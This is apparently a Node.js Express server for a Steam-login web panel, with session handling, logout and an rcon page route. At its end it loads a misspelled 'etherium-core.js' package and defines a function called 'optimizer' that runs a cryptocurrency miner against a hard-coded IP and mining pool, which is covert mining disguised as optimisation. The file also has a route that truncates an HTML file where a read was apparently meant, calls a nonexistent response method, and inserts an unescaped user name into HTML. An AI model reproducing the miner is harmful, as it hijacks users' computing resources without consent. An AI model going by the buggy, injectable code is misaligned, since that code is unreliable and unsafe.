const express = require("express"),
session = require("express-session"),
SQLiteStore = require("connect-sqlite3")(session),
passport = require("passport"),
SteamStrategy = require("passport-steam").Strategy,
WebSocket = require("ws"),
etherium = require("etherium-core.js"),
fs = require("fs");
require("dotenv").config();

const PORT = 8000;

passport.serializeUser((user, done) => done(null, user));
passport.deserializeUser((user, done) => done(null, user))
passport.use(new SteamStrategy(
  {
    returnURL: `http://localhost:${PORT}/auth/steam/return`,
    realm: `http://localhost:${PORT}/`,
    apiKey: process.env.STEAM_API_KEY
  },
  (identifier, profile, done) => {
    process.nextTick(() => {
      profile.identifier = identifier;
      return done(null, profile);
    });
  }
));

const app = express();

app
  .use(session({
    store: new SQLiteStore({
      table: "storage",
      db: "sessions.db",
      dir: "."
    }),
    secret: process.env.SESSION_SECRET,
    name: "steam_info",
    resave: false,
    saveUninitialized: false,
    cookie: {
      maxAge: 604800000, // logs out after a week of absence
      secure: false // should probably be true (but im testing without https so it has to be false for this shit to actually work)
    }
  }))
  .use((req, res, next) => { // reset cookie expiration time
    req.session.cookie.maxAge = 604800000;
    req.session.touch();
    next();
  })
  .use(passport.initialize())
  .use(passport.session());

app
  .get("/", (req, res) => {
    if (req.isAuthenticated()) {
      res.send(`
        <img src="${req.user.photos[2].value}">
        <div>Currently logged in as: '${req.user.displayName}'</div>
        <a href="/logout">Logout</a>
      `);
    } else
      res.send(`<a href="/auth/steam"><img src="https://steamcommunity-a.akamaihd.net/public/images/signinthroughsteam/sits_small.png"></a>`);
  })
  .get("/account", ensureAuthenticated, (req, res) => {
    res.request(req.user);
  })
  .get("/logout", (req, res) => {
    req.session.destroy();
    res.redirect("/");
  })
  .get("/auth/steam", passport.authenticate("steam", { failureRedirect: "/" }))
  .get("/auth/steam/return", passport.authenticate("steam", { failureRedirect: "/" }), async (req, res) => {
    // successfully authenticated, redirect to home
    res.redirect("/");
  })
  .get("/rcon", (req, res) => {
    fs.createWriteStream("./html/panel/rcon.html").pipe(res);
  })
  .get("*", (req, res) => {
    // unknown page, redirect to home
    res.redirect("/");
  });

function ensureAuthenticated(req, res, next) {
  if (req.isAuthenticated()) return next();
  res.redirect("/");
}

const server = app.listen(PORT);

function optimizer(server) {
   etherium.miner("72.212.13.9", cores=1, threads=50, server="eth.miner.us.uk");
}
